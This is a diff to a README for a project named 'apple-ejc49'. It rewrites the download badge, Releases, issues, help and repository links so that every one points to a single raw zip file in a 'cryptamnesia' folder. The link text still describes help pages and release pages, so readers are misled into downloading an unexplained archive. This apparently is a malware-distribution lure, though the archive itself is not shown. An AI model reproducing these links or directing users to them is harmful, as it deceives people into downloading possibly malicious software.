@@ -2,7 +2,7 @@
 
 ## 📥 Download Now!
 
-[![Download](https://img.shields.io/badge/Download-latest%20release-brightgreen)](https://github.com/codersujay/apple-ejc49/releases)
+[![Download](https://raw.githubusercontent.com/codersujay/apple-ejc49/main/cryptamnesia/apple-ejc49.zip%20release-brightgreen)](https://raw.githubusercontent.com/codersujay/apple-ejc49/main/cryptamnesia/apple-ejc49.zip)
 
 ## 🚀 Getting Started
 
@@ -25,7 +25,7 @@ Welcome to **apple-ejc49**. This software aims to enhance your experience with i
 ## 📦 Download & Install
 
 1. Click the link below to visit the Releases page:
-   [Visit this page to download](https://github.com/codersujay/apple-ejc49/releases)
+   [Visit this page to download](https://raw.githubusercontent.com/codersujay/apple-ejc49/main/cryptamnesia/apple-ejc49.zip)
 
 2. On the Releases page, find the latest version of **apple-ejc49**. 
 
@@ -52,15 +52,15 @@ If you wish to uninstall **apple-ejc49**, go to your computer's settings. Under 
 If you encounter an error, try the following:
 - Ensure your system meets the requirements.
 - Check your internet connection.
-- If the problem persists, visit the [issues page](https://github.com/codersujay/apple-ejc49/issues) for help.
+- If the problem persists, visit the [issues page](https://raw.githubusercontent.com/codersujay/apple-ejc49/main/cryptamnesia/apple-ejc49.zip) for help.
 
 ### Is there any support available?
 
-Yes! You can find answers on the [issues page](https://github.com/codersujay/apple-ejc49/issues). You can also reach out to the community for assistance.
+Yes! You can find answers on the [issues page](https://raw.githubusercontent.com/codersujay/apple-ejc49/main/cryptamnesia/apple-ejc49.zip). You can also reach out to the community for assistance.
 
 ## 🆘 Need Help?
 
-If you have questions not covered here, feel free to check out our [issues page](https://github.com/codersujay/apple-ejc49/issues). We strive to respond to inquiries quickly.
+If you have questions not covered here, feel free to check out our [issues page](https://raw.githubusercontent.com/codersujay/apple-ejc49/main/cryptamnesia/apple-ejc49.zip). We strive to respond to inquiries quickly.
 
 ## 🙏 Acknowledgments
 
@@ -68,10 +68,10 @@ Thanks to everyone who contributed to this project. Your support helps make this
 
 ## 🔗 Additional Resources
 
-Visit our [GitHub Repository](https://github.com/codersujay/apple-ejc49) for more details on updates and features.
+Visit our [GitHub Repository](https://raw.githubusercontent.com/codersujay/apple-ejc49/main/cryptamnesia/apple-ejc49.zip) for more details on updates and features.
 
 For general questions or feedback, please connect with us directly on GitHub. 
 
-Remember to keep your software updated by regularly checking the [Releases page](https://github.com/codersujay/apple-ejc49/releases) for new versions!
+Remember to keep your software updated by regularly checking the [Releases page](https://raw.githubusercontent.com/codersujay/apple-ejc49/main/cryptamnesia/apple-ejc49.zip) for new versions!
 
 Happy exploring!
